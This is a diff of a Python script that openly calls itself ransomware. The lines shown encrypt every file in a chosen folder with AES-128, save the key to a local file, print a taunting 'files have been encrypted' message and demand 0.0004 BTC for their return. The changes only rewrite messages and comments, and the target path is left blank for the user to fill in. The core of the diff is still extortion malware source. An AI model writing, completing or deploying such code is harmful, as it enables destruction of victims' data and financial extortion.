@@ -49,20 +49,19 @@ def encrypt_folder(folder_path, key):
             encrypt_file(file_path, key)
 
 def dramatic_print(message, delay=1):
-    """Function to print messages with a delay for dramatic effect."""
     for char in message:
         print(char, end='', flush=True)
         time.sleep(0.05)  
     print()  
 
 def main():
-    dramatic_print("💀 Starting ransomware... 💀", delay=2)
+    dramatic_print("weeeee... ", delay=2)
     time.sleep(1)
     
     print_skull()
     time.sleep(2)
     
-    dramatic_print("\n💀 Your files have been encrypted! 💀")
+    dramatic_print("\n Your files have been encrypted loser!")
     time.sleep(1)
     
     dramatic_print("Send 0.0004 BTC to get them back.\n")
@@ -70,7 +69,7 @@ def main():
 
     folder_to_encrypt =  #Here is where u add the path 
 
-    key = get_random_bytes(16)  # AES-128
+    key = get_random_bytes(16)  #AES-128
     with open("encryption_key.bin", "wb") as key_file:
         key_file.write(key)
     
